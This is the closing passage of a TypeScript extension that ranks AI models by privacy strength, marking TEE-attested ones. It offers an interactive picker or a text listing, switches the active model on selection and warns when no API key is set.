            const cur = ctx.getModel?.() ?? { provider: currentProviderId, id: currentModelId };
            const isCurrent = (m: PickerModel) => m.provider === cur.provider && m.id === cur.id;

            // Map each option string back to its model. Deterministic order (rankModels
            // sorts stably), so a duplicate label — same tier, provider, id — is a true
            // duplicate and collapsing it is harmless.
            const byLabel = new Map<string, PickerModel>();
            const options = ranked.map((e) => {
              const label = pickerOptionLabel(e, isCurrent(e.model));
              byLabel.set(label, e.model);
              return label;
            });

            // No interactive picker (print/JSON): still surface the ranking as text —
            // useful to SEE which of your models is most private, even headless.
            if (!ctx.hasUI || typeof ctx.ui?.select !== "function") {
              ctx.ui?.notify?.(
                `Models by privacy (strongest first):\n${options.join("\n")}\n` +
                  `◆ = TEE that verifies when selected. Switch with /model.`,
                "info",
              );
              return;
            }

            const choice = await ctx.ui.select(
              "Pick a model (strongest privacy first — ◆ verifies on select):",
              options,
            );
            if (!choice) return; // cancelled
            const model = byLabel.get(choice);
            if (!model) return;
            if (isCurrent(model)) {
              ctx.ui?.notify?.("Already on that model.", "info");
              return;
            }
            if (typeof pi.setModel !== "function") {
              ctx.ui?.notify?.("This host can't switch models programmatically.", "warning");
              return;
            }
            const ok = await pi.setModel(model);
            // On success the model_select event fires refreshPosture() → live badge +
            // attestation, so we don't duplicate that here. false = no API key.
            if (!ok)
              ctx.ui?.notify?.(
                `Could not switch to ${model.provider}/${model.id} — no API key configured for it.`,
                "warning",
              );
          },
        });
      }
    }
  };
}

// Default export: the marketplace-installable extension with default options.
export default makePiPrivacyExtension();
